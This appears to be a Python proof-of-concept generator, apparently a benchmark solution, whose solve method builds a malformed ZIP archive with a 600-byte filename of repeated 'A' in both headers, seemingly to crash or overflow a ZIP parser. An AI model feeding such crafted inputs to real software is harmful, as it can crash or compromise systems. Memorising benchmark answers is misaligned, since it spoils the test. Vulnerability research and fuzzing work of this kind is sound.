import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        name_len = 600
        filename = b"A" * name_len

        # Local File Header
        local_sig = 0x04034B50
        version_needed = 20
        flags = 0
        method = 0  # stored
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        extra_len = 0

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            local_sig,
            version_needed,
            flags,
            method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            name_len,
            extra_len,
        ) + filename

        # Central Directory File Header
        central_sig = 0x02014B50
        version_made_by = 20
        file_comment_len = 0
        disk_start = 0
        internal_attr = 0
        external_attr = 0
        local_header_offset = 0

        central_header = struct.pack(
            "<IHHHHHIIIHHHHHII",
            central_sig,
            version_made_by,
            version_needed,
            flags,
            method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            name_len,
            extra_len,
            file_comment_len,
            disk_start,
            internal_attr,
            external_attr,
            local_header_offset,
        ) + filename

        # End of Central Directory
        eocd_sig = 0x06054B50
        disk_no = 0
        disk_cd_start = 0
        entries_disk = 1
        entries_total = 1
        cd_size = len(central_header)
        cd_offset = len(local_header)
        comment_len = 0

        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            disk_no,
            disk_cd_start,
            entries_disk,
            entries_total,
            cd_size,
            cd_offset,
            comment_len,
        )

        return local_header + central_header + eocd